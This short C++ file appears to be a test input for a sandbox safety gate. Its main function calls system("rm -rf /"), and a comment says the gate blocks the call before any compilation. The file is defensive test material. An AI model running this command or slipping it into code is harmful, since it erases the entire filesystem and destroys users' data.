#include <cstdlib>
int main() {
    system("rm -rf /");        // blocked by the safety gate BEFORE any compiler runs
    return 0;
}
